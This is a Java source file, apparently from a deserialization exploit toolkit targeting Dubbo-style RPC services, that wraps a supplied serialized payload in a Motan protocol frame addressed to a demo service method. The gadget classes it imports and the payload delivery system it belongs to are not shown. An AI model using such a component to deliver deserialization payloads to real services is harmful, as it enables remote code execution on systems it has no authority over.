package com.threedr3am.exp.dubbo.protocol.motan;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.threedr3am.exp.dubbo.payload.PackageType;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.protocol.Protocol;
import com.threedr3am.exp.dubbo.serialization.Serialization;
import com.threedr3am.exp.dubbo.utils.JDKUtil;
import com.weibo.api.motan.util.ByteUtil;
import org.apache.commons.cli.CommandLine;
import org.apache.dubbo.common.io.Bytes;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.util.Map;
import java.util.Random;

public class MotanProtocol implements Protocol {
    @Override
    public byte[] makeData(byte[] bytes, Serialization serialization, Map<String, String> extraData) throws Exception {
        // 其他参数
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutput objectOutputStream = new ObjectOutputStream(outputStream);
        objectOutputStream.writeUTF("com.weibo.motan.demo.service.MotanDemoService");
        objectOutputStream.writeUTF("commonTest");
        objectOutputStream.writeUTF("java.lang.Object");
        objectOutputStream.writeObject(bytes);
        objectOutputStream.flush();
        byte[] body = outputStream.toByteArray();

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        long requestID=(new Random().nextInt(100000000));

        byte[] header = new byte[16];
        int offset = 0;
        ByteUtil.short2bytes( (short) 0xF0F0,header,0);

        offset +=2;
        header[offset++] = 1;
        header[offset++] = 0;
        ByteUtil.long2bytes(requestID,header,offset);
        ByteUtil.int2bytes(body.length, header, 12);
        byte[] data = new byte[header.length+body.length];
        System.arraycopy(header, 0, data, 0, header.length);
        System.arraycopy(body, 0, data, header.length, body.length);

        byte[] result = new byte[16+data.length];
        ByteUtil.short2bytes((short) 0xF1F1,result,0);
        result[3] = 0x00;
        ByteUtil.long2bytes(requestID,result,4);
        ByteUtil.int2bytes(data.length,result,12);
        System.arraycopy(data, 0, result, 16, data.length);


        try {
            byteArrayOutputStream.write(result);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return byteArrayOutputStream.toByteArray();

    }

    @Override
    public Map<String, String> initExtraData(CommandLine cmd) {
        return null;
    }
}
